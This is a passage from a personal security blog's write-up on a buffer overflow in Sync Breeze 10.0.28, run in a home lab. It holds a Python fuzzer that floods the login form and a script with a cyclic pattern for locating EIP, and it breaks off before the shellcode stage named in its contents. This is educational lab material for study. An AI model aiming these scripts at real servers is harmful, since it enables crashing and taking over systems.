<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    <script defer language="javascript" type="text/javascript" src="/js/light_dark.js"></script>
<script defer language="javascript" type="text/javascript" src="/js/tabs.js"></script>


<script defer language="javascript" type="text/javascript" src="/js/katex.min.js"></script>


<script defer language="javascript" type="text/javascript" src="/js/auto-render.min.js"></script>


<script defer language="javascript" type="text/javascript" src="/js/katex.js"></script>
<script defer language="javascript" type="text/javascript" src="/js/toc.js"></script>


    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="generator" content="Hugo 0.110.0">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Buffer Overflow &middot; </title>
    <meta name="description" content="" />

    
    <link type="text/css" rel="stylesheet" href="/css/poole.css">
<link type="text/css" rel="stylesheet" href="/css/syntax.css">
<link type="text/css" rel="stylesheet" href="/css/hyde.css">
<link type="text/css" rel="stylesheet" href="/css/poison.css">
<link type="text/css" rel="stylesheet" href="/css/fonts.css">
<link type="text/css" rel="stylesheet" href="/css/katex.min.css">
<link type="text/css" rel="stylesheet" href="/css/tabs.css">


    
    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5a5a5a;
        --link-color: #268bd2;
        --date-color: #515151;
        --code-color: #bf616a;
        --code-background-color: #f9f9f9;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #eee;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9d9d9d;
        --link-color: #268bd2;
        --date-color: #9a9a9a;
        --code-color: #ff7f7f;
        --code-background-color: #393D47;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

    
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=GA_TRACKING_ID"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-LX7DVC3P8K');
    </script>
</head>

    <body class="">
        <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="/">
                <img src="/images/profilepix.jpg" alt="brand image">
            </a>
        
        
            <a href="/">
                <h1>Ron Bulaon</h1>
            </a>
        
    </h1>
    <p class="lead">
    Build - Secure - Innovate
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">
        
        
        
        
            
                
                    <li class="heading">
                        <a href="/about/">About Me</a>
                    </li>
                    
                
            
                
            
                
            
        
        
            
                
            
                
            
                
                    <li class="heading">
                        <a href="/posts/">Read Posts</a>
                    </li>
                    
                
            
        
        
            
                
            
                
                    <li class="heading">
                        <a href="/featured/">Featured Post</a>
                    </li>
                    
                        <li class="sub-heading">
                            
                        </li>
                        
                            <li class="bullet">
                                <a href="/featured/bof/">Buffer Overflow</a>
                            </li>
                        
                    
                
            
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" href="https://github.com/RonBulaon">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>


    <a target="_blank" class="social" href="https://www.linkedin.com/in/ronbulaon/">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>






    <a target="_blank" class="social" href="https://www.youtube.com/c/RonBulaon">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
            <path fill="currentColor" d="M12.006 19.012h-.02c-.062 0-6.265-.012-7.83-.437a2.5 2.5 0 0 1-1.764-1.765A26.494 26.494 0 0 1 1.986 12a26.646 26.646 0 0 1 .417-4.817A2.564 2.564 0 0 1 4.169 5.4c1.522-.4 7.554-.4 7.81-.4H12c.063 0 6.282.012 7.831.437c.859.233 1.53.904 1.762 1.763c.29 1.594.427 3.211.407 4.831a26.568 26.568 0 0 1-.418 4.811a2.51 2.51 0 0 1-1.767 1.763c-1.52.403-7.553.407-7.809.407Zm-2-10.007l-.005 6l5.212-3l-5.207-3Z"/>
        </svg>
    </a>




        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2023 . All rights reserved.
</p>

  </div>
</aside>

        <main class="content container">
            <div class="post">
  <div class="info">
    <h1 class="post-title">
        <a href="/featured/bof/">Buffer Overflow</a>
    </h1>
    <time datetime="2023-02-03T00:28:29-0600" class="post-date">
        February 3, 2023
    </time>
    
    <ul class="tags">
        
        <li class="tag-security">
            <a href="/tags/security">security</a>
        </li>
        
        <li class="tag-hacking">
            <a href="/tags/hacking">hacking</a>
        </li>
        
        <li class="tag-linux">
            <a href="/tags/linux">linux</a>
        </li>
        
        <li class="tag-windows">
            <a href="/tags/windows">windows</a>
        </li>
        
        <li class="tag-vscode">
            <a href="/tags/vscode">vscode</a>
        </li>
        
        <li class="tag-burpsuite">
            <a href="/tags/burpsuite">burpsuite</a>
        </li>
        
        <li class="tag-pentesting">
            <a href="/tags/pentesting">pentesting</a>
        </li>
        
    </ul>
    
    
    
    
        <p class="seriesname">
            Series: <a href="/series/hacking">Hacking</a>
        </p>
    
    
    
</div>

  <p>Buffer overflow attacks have been a topic of discussion in the cybersecurity world for a long time, but I believe there&rsquo;s always room for another perspective.</p>
<p>In this writeup, I will take a unique approach and walk you through the process of executing a buffer overflow attack using VSCode as my code editor and BurpSuite to generate the initial request in Python.</p>
<p>My goal is to provide a clear and concise explanation of this complex topic, so that even those with limited experience can understand the mechanics behind buffer overflow attacks.</p>
<img src="/images/reverseShell.gif" alt="Reverse Shell"/>
<!-- TOC ignore:true --> 
<h2>Table of Contents</h2> 
<!-- TOC -->
<ul>
<li><a href="#overview">Overview</a></li>
<li><a href="#requirements">Requirements</a>
<ul>
<li><a href="#system-requirements">System Requirements</a></li>
<li><a href="#installing-vulnerable-application">Installing Vulnerable Application</a></li>
</ul>
</li>
<li><a href="#fuzzing">Fuzzing</a>
<ul>
<li><a href="#check-if-application-is-vulnerable">Check if Application is Vulnerable</a></li>
<li><a href="#verify-vulnerability">Verify Vulnerability</a>
<ul>
<li><a href="#attach-sync-breeze-service-to-immunuty-debugger">Attach Sync Breeze service to Immunuty Debugger</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#exploitation">Exploitation</a>
<ul>
<li><a href="#locating-eip">Locating EIP</a></li>
<li><a href="#controlling-eip">Controlling EIP</a></li>
</ul>
</li>
<li><a href="#check-for-bad-characters">Check for Bad Characters</a></li>
<li><a href="#finding-jmp-esp">Finding JMP ESP</a></li>
<li><a href="#writing-shellcode">Writing Shellcode</a></li>
<li><a href="#gaining-shell">Gaining Shell</a></li>
</ul>
<!-- /TOC -->
<br/>
<h1 id="overview">Overview</h1>
<p>In this simulation, I aim to uncover vulnerabilities in the application &lsquo;Sync Breeze.&rsquo; After some research, I have found that this specific version of the application is susceptible to buffer overflow attacks. Thus a good sample to test out my buffer overflow sequence.</p>
<p>The process involves fuzzing the application to determine its vulnerability, then locating the memory location of the EIP. Once the EIP is found, I will inject instructions to redirect it to a custom-crafted shellcode to take over the system.</p>
<p>This write-up is an actual simulation I did. I welcome constructive feedback and suggestions for improvement. If you notice anything that needs correction, please let me know.</p>
<br/>
<h1 id="requirements">Requirements</h1>
<h2 id="system-requirements">System Requirements</h2>
<p>You will need the following:</p>
<ol>
<li>Virtualization Application like <a href="https://www.virtualbox.org/">Virtualbox</a> and <a href="https://www.vmware.com/asean/products/workstation-player/workstation-player-evaluation.html">VMware Player</a>.</li>
<li><a href="https://www.kali.org/downloads/">Kali Linux Vitual Machine</a></li>
<li><a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">Windows 10 </a> installed with:
<ul>
<li><a href="https://www.immunityinc.com/products/debugger/">Immunity Debuger</a> with <a href="https://github.com/corelan/mona">Mona Modules</a> (more details later)</li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview">TCP View </a></li>
<li><a href="#installing-vulnerable-application">Sync Breeze</a></li>
</ul>
</li>
<li>Any text editor for editing Python codes. I use <a href="https://code.visualstudio.com/">VS Code</a>.</li>
</ol>
<p>On your local machine download Kali Linux Virtual machine boot it up within your Virtualization of choice. Do the same for Windows 10 and install the tools as listed above.</p>
<br/>
<h2 id="installing-vulnerable-application">Installing Vulnerable Application</h2>
<p>For testing purposes, download and install Sync Breeze version 10.0.28.</p>
<img src="/images/sbscrshot.png" alt="Sync Breeze Configuration" width="500"/>
<ol>
<li><a href="https://www.exploit-db.com/apps/959f770895133edc4cf65a4a02d12da8-syncbreezeent_setup_v10.0.28.exe">Download</a> and install.</li>
<li>Open and navigate to Tools &gt; Advance Options &gt; Server</li>
<li>Put a check on Enable web server port and use port 80</li>
<li>Click Save</li>
</ol>
<p><a href="#overview">Back to top</a></p>
<br>
<h1 id="fuzzing">Fuzzing</h1>
<p>Fuzzing is a technique used to find security vulnerabilities in software applications by sending random and unexpected inputs to the application. In the context of buffer overflow attacks, fuzzing is used to identify inputs that can cause the application to crash or behave abnormally. This can help to identify areas in the application that are susceptible to buffer overflow attacks and can assist in developing a proof-of-concept attack.</p>
<p>When a fuzzer sends random data to an application, it may uncover areas where the application is not properly checking or sanitizing inputs. If the input data is large enough, it can cause the application to overwrite memory in unexpected ways, leading to a buffer overflow. By continuously sending different inputs to the application, the fuzzer can identify inputs that cause the application to crash, indicating the presence of a potential vulnerability.</p>
<br/>
<h2 id="check-if-application-is-vulnerable">Check if Application is Vulnerable</h2>
<ol>
<li>From Windows 10 make sure Sync Breeze Service is running. Use <code>service.msc</code> to check iservice status.</li>
<li>From Kali, open a browser witth Burpsuite as proxy.</li>
<li>At Burpsuite turn off intercept at Proxy &gt; Intercept, then make sure <strong>Intercept is off</strong>.</li>
<li>Navigate to Sync Breeze login page from the browser. And use any login credentials, we do not need to really login.
<img src="/images/loginSample.png" alt="Sample Login" width="450"/></li>
<li>An error is expected. <br />
<img src="/images/loginError.png" alt="Login Error" width="450"/></li>
<li>On Burpsuite, go to Proxy &gt; HTTP History. Look for the request you just made for login. Once found, right click on it and select <strong>Copy as requests</strong>.
<img src="/images/burpsuiteRequest.png"/></li>
<li>On your code editor, paste copied requests from Buprsuite. <br />
<img src="/images/pasteInVSCode.png" alt="Paste in VS Code" width="500"/></li>
<li>Edit the code to match the code below. Chang the IP address to match yours.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>size <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(size <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3000</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        usernameEntry <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> size
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        burp0_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.96:80/login&#34;</span>
</span></span><span style="display:flex;"><span>        burp0_headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span>, 
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span>, 
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;en-US,en;q=0.5&#34;</span>, 
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate&#34;</span>, 
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>, 
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Origin&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96&#34;</span>, 
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;close&#34;</span>, <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96/login&#34;</span>, 
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        burp0_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: usernameEntry, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;testlogin&#34;</span>}
</span></span><span style="display:flex;"><span>        receivedData <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(burp0_url, headers<span style="color:#f92672">=</span>burp0_headers, data<span style="color:#f92672">=</span>burp0_data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;no crash at </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> size)
</span></span><span style="display:flex;"><span>        size <span style="color:#f92672">+=</span> <span style="color:#ae81ff">50</span>
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;crash at </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> size)
</span></span><span style="display:flex;"><span>        exit()   
</span></span></code></pre></div></li>
</ol>
<p>Notice that I replace the hardcoded password to use the variable <strong>usernameEntry</strong>. Ideally we have to do this test on all possible inputs until the application breaks. In our test case we only have username and password.</p>
<p>This code will put in an increasing number of &lsquo;A&rsquo; characters until the application crashes. Once it crashed, it will return the &lsquo;size&rsquo; of the characters that makes it crash. <br/>
<img src="/images/fuzzing1.png" alt="drawing" width="450"/><br/>
When I executed, the application breaks at 800 characters. This means we might be able to to exploit it using Buffer Overflow technique.</p>
<p><a href="#overview">Back to top</a></p>
<br/>
<h2 id="verify-vulnerability">Verify Vulnerability</h2>
<p>Let us now verify that we really have buffer Oveflow using immunity debugger.</p>
<h3 id="attach-sync-breeze-service-to-immunuty-debugger">Attach Sync Breeze service to Immunuty Debugger</h3>
<ol>
<li>From windowss 10 services make sure the service is running.
<img src="/images/syncbreezeService.png" alt="Sync Breeze Service" width="350"/></li>
<li>At this point we know that the target service runs on port 80, but we do not know the exact service name. To help us determine the exact Process Name of the target service we&rsquo;ll use TCP view. Look for the Process Name that uses <strong>Local Port 80</strong>.
<img src="/images/tcpview.png" alt="Local Port" width="550"/></li>
<li>Then make sure Immunity debugeer is running on adminsitrator mode i.e. Right-click shortcut &gt; <strong>Run as Adnminsitrator</strong>.
<img src="/images/debuggerAdminMode.png" alt="Local Port" width="350"/></li>
<li>From immunity Debugger click <strong>File</strong> &gt; <strong>Attach</strong>. Then select syncbrc (or whichever match the local port 80) then click <strong>Attach</strong>. Then press f9 or Play button. <br />
<img src="/images/attachProcessname.png" alt="Local Port" width="500"/></li>
<li>Execute the python script we made earlier. Again we&rsquo;re expecting it to crash at 800 like how we have tested earlier.
<img src="/images/fuzzing1.png" alt="Crash" width="450"/></li>
<li>Notice that we have <strong>Access Violation</strong> at <code>41414141</code>. <code>41414141</code> is the haxadecimal value equivalent of character <code>AAAA</code> that which we inputed on username field using our fuzzing script.
<img src="/images/accessViolation.png" alt="Access Violation" />
We now have over written the EIP and therefore we have commited a buffer overflow. We can now exploit this information to make it execute what ever we need.</li>
</ol>
<p><a href="#overview">Back to top</a></p>
<br>
<h1 id="exploitation">Exploitation</h1>
<h2 id="locating-eip">Locating EIP</h2>
<p>Now that we know the exact size needed to crash the target application let&rsquo;s clean the code and and indicate 800 as size without the need to fuzz.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>usernameEntry <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">800</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    burp0_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.96:80/login&#34;</span>
</span></span><span style="display:flex;"><span>    burp0_headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span>, <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;en-US,en;q=0.5&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Origin&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;close&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96/login&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    burp0_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: usernameEntry, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;testlogin&#34;</span>}
</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>post(burp0_url, headers<span style="color:#f92672">=</span>burp0_headers, data<span style="color:#f92672">=</span>burp0_data)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;crashed&#34;</span>)
</span></span></code></pre></div><p>Make sure <a href="#attach-sync-breeze-service-to-immunuty-debugger">Sync Breeze is running</a> then execute this code. We are expecting a crash similar to the access violation we had earlier.</p>
<p>To determine <strong>EIP&rsquo;s exact location</strong>, instead using 800 characters of A, we&rsquo;ll be a string with non repeating pattern. We&rsquo;ll then check the EIP value once it crashed to determine how much buffer we actually need to write the EIP.</p>
<ol>
<li>
<p>Generate the string of non-repeating pattern using a metasploit tool (installed by default at kali).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span style="color:#ae81ff">800</span>
</span></span></code></pre></div><img src="/images/patternCreate.png" alt="Pattern" width="700"/>
</li>
<li>
<p>We&rsquo;ll now use this string to replace the value of <strong>usernameEntry</strong> in our code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>usernameEntry <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    burp0_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.96:80/login&#34;</span>
</span></span><span style="display:flex;"><span>    burp0_headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span>, <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;en-US,en;q=0.5&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Origin&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;close&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96/login&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>
</span></span><span style="display:flex;"><span>        }
